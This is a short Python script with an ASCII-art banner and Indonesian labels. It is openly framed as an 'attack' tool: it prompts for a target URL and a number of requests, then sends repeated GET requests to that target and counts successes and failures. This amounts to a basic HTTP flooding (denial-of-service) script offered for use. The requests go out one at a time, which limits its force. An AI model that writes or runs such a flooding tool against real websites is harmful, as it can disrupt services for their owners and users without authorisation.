import asyncio
import aiohttp
from rich.console import Console

console = Console()

# Banner
console.print("[cyan]")
console.print(" ███╗   ███╗██╗   ██╗ ███████╗██╗")
console.print(" ████╗ ████║╚██╗ ██╔╝ ██╔════╝██║")
console.print(" ██╔████╔██║ ╚████╔╝  █████╗  ██║")
console.print(" ██║╚██╔╝██║  ╚██╔╝   ██╔══╝  ██║")
console.print(" ██║ ╚═╝ ██║   ██║    ███████╗███████╗")
console.print(" ╚═╝     ╚═╝   ╚═╝    ╚══════╝╚══════╝")
console.print("   La Tahzan Innallah Ma’ana")
console.print(" =========================================")
async def attack(url, jumlah):
    sukses = 0
    gagal = 0
    async with aiohttp.ClientSession() as session:
        for i in range(jumlah):
            try:
                async with session.get(url) as resp:
                    console.print(f"[green]OK {resp.status}[/green]")
                    sukses += 1
            except Exception as e:
                console.print(f"[red]ERROR {e}[/red]")
                gagal += 1
    console.print(f"[cyan]Total request: {jumlah}[/cyan]")
    console.print(f"[green]Sukses: {sukses}[/green]")
    console.print(f"[red]Gagal: {gagal}[/red]")

url = input("URL Target: ")
jumlah = int(input("Jumlah request: "))
asyncio.run(attack(url, jumlah))
